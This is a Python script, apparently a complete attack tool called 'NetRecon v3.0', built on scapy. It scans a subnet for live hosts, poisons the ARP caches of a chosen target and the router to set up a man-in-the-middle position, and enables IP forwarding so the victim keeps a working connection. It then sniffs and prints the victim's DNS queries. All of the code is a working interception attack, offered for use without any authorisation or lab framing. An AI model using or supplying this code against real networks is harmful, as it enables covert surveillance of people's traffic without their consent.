import ipaddress
import platform
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sniff, srp

# =================================================================
#                         HELPER FUNCTIONS
# =================================================================


def get_gateway_ip():
  """Automatically detects the default gateway (router) IP."""
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    gateway = s.getsockname()[0]
    s.close()
    # Assume typical home subnet gateway .1
    parts = gateway.split(".")
    return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
  except Exception:
    return "192.168.1.1"


def get_mac(ip):
  """Resolves MAC address for a given IP address."""
  try:
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False
    )
    for _, rcv in ans:
      return rcv[Ether].src
  except Exception:
    return None


def enable_ip_forwarding():
  """Enables IP forwarding on Linux to prevent dropping victim's traffic."""
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("1")
    print("[+] IP Forwarding enabled successfully.")
  except Exception as e:
    print(f"[-] Warning: Could not enable IP forwarding automatically: {e}")


def disable_ip_forwarding():
  """Disables IP forwarding back to default on exit."""
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("0")
  except Exception:
    pass


# =================================================================
#                     ARP SPOOFING (MITM) ENGINE
# =================================================================


def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
  """Continuously poisons ARP cache of target and gateway to intercept traffic."""
  print(
      f"[*] ARP Spoofing active: Target ({target_ip}) <---> Gateway"
      f" ({gateway_ip})"
  )
  while not stop_event.is_set():
    # Tell target we are the gateway
    send(
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
        verbose=False,
    )
    # Tell gateway we are the target
    send(
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
        verbose=False,
    )
    time.sleep(2)


def restore_network(target_ip, target_mac, gateway_ip, gateway_mac):
  """Restores original ARP tables upon exit."""
  print("\n[*] Restoring network ARP tables...")
  send(
      ARP(
          op=2,
          pdst=target_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=gateway_ip,
          hwsrc=gateway_mac,
      ),
      count=5,
      verbose=False,
  )
  send(
      ARP(
          op=2,
          pdst=gateway_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=target_ip,
          hwsrc=target_mac,
      ),
      count=5,
      verbose=False,
  )
  print("[+] Network restored.")


# =================================================================
#                        HOST & PORT SCANNER
# =================================================================


def ping_host(ip):
  param = "-n" if platform.system().lower() == "windows" else "-c"
  command = ["ping", param, "1", "-W", "1", str(ip)]
  try:
    if subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
      return str(ip)
  except Exception:
    pass
  return None


def scan_network(subnet):
  print(
      "\n================================================================="
  )
  print("                  ADVANCED HOST DISCOVERY                        ")
  print(
      "================================================================="
  )
  try:
    net = ipaddress.ip_network(subnet, strict=False)
  except ValueError as e:
    print(f"[-] Invalid subnet: {e}")
    return []

  active_hosts = []
  print(f"[*] Scanning {subnet} for active devices...")

  with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(ping_host, net.hosts())
    for ip in results:
      if ip:
        print(f"[+] Active Host Discovered: {ip}")
        active_hosts.append(ip)

  print(f"==================================================")
  print(f"[+] Scan Completed. Total Active Hosts: {len(active_hosts)}")
  return active_hosts


# =================================================================
#                      DNS PACKET HANDLER
# =================================================================


def dns_callback(packet):
  """Filters and displays DNS queries passing through."""
  if packet.haslayer(DNS) and packet.haslayer(DNSQR):
    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore")
    src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
    print(f"[DNS QUERY] Source: {src_ip} ---> Requested Domain: {qname}")


# =================================================================
#                            MAIN FLOW
# =================================================================


def main():
  print(
      "================================================================="
  )
  print("                 NetRecon v3.0 (Linux Edition)                   ")
  print("             Ultimate Network Recon & Universal Sniffer          ")
  print(
      "================================================================="
  )

  # Interface selection prompt
  interface = input(
      "[*] Enter interface name to use (e.g., wlan0, eth0) or press Enter for"
      " default: "
  ).strip()
  if not interface:
    interface = None

  subnet_input = input(
      "[*] Enter target network / subnet (e.g., 192.168.1.0/24): "
  ).strip()

  active_hosts = scan_network(subnet_input)
  if not active_hosts:
    print("[-] No active hosts found on the network.")
    sys.exit(1)

  print("\n------------------------------------------------------------------")
  print("DNS SNIFFER MODES:")
  print("1. Target a specific device (With ARP Spoofing / MITM)")
  print("2. Sniff ALL network devices (Universal Mode / MITM)")
  print("------------------------------------------------------------------")

  mode = input("[*] Choose sniffer mode (1 or 2): ").strip()

  gateway_ip = get_gateway_ip()
  target_ip = None

  if mode == "1":
    target_ip = input(
        "[*] Enter target IP to sniff (e.g., 192.168.1.55): "
    ).strip()
  elif mode == "2":
    print(
        "[*] Universal mode selected. Please select a target device to spoof"
        " and intercept:"
    )
    for idx, host in enumerate(active_hosts):
      if host != gateway_ip:
        print(f"    {idx}. {host}")
    try:
      choice = int(
          input("[*] Enter the number of the target device to intercept: ")
      )
      target_ip = active_hosts[choice]
    except (ValueError, IndexError):
      print("[-] Invalid selection. Exiting.")
      sys.exit(1)
  else:
    print("[-] Invalid mode selected.")
    sys.exit(1)

  print(f"\n[*] Target selected for interception: {target_ip}")
  print(f"[*] Gateway (Router) IP: {gateway_ip}")

  # Resolve MAC addresses
  print("[*] Resolving MAC addresses...")
  gateway_mac = get_mac(gateway_ip)
  target_mac = get_mac(target_ip)

  if not gateway_mac or not target_mac:
    print(
        "[-] Error: Could not resolve MAC addresses for gateway or target."
        " Aborting."
    )
    sys.exit(1)

  # Enable IP Forwarding so victim doesn't lose internet connection
  enable_ip_forwarding()

  # Start ARP Spoofing thread
  stop_event = threading.Event()
  spoof_thread = threading.Thread(
      target=arp_spoof,
      args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event),
  )
  spoof_thread.daemon = True
  spoof_thread.start()

  print(
      "\n================================================================="
  )
  print(f"[*] Listening on interface: {interface if interface else 'default'}")
  print("[*] MITM DNS SNIFFING ACTIVE (Intercepting Traffic)")
  print("[*] Press CTRL+C to stop.")
  print(
      "================================================================="
  )

  try:
    # Sniff traffic passing through our interface
    sniff(iface=interface, filter="udp port 53", prn=dns_callback, store=0)
  except KeyboardInterrupt:
    print("\n[*] Stopping sniffer...")
  finally:
    # Cleanup: Stop spoofing, restore network, and disable IP forwarding
    stop_event.set()
    spoof_thread.join()
    restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
    disable_ip_forwarding()
    print("[+] Program exited cleanly.")


if __name__ == "__main__":
  main()
